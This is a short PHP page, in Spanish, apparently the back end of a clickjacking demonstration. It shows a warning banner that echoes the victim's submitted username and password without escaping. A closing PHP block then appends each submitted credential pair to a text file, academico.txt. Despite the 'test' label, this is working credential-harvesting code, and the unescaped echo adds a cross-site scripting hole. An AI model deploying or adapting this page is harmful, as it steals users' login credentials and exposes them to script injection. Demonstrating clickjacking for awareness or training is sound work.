<!DOCTYPE html>
<html>
<head>
	<title>Test ClickJacking</title>
	<link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
</head>
<style type="text/css">
	.alert-danger {
    color: #a94442;
    background-color: #f2dede;
    border-color: #ebccd1;
	}
	.alert {
    padding: 15px;
    margin-bottom: 20px;
    border: 1px solid transparent;
    border-radius: 4px;
	}
</style>
<body>
<div class="container">
	<div class="row">
	<div class="alert alert-danger alert-dismissible" role="alert">
  <strong><i class="fa fa-warning"></i> Peligro!</strong>
  <p style="font-family: Impact; font-size: 18pt; text-align: center;">Este es un test de ClickJacking.</p>
  <marquee>
  	<p style="font-family: Impact; font-size: 18pt">Tu usuario: <?php echo $_POST['txt_usr']; ?> y tu contraseña es: <?php echo $_POST['txt_pwd']; ?>. </p>
  </marquee>
</div>

</body>
</html>

<?php
$texto=file_get_contents('academico.txt');
$fp=fopen("academico.txt", "w");
fwrite($fp, $texto."Usuario: ".$_POST['txt_usr']." Password: ".$_POST['txt_pwd']."\n");
fclose($fp);
?>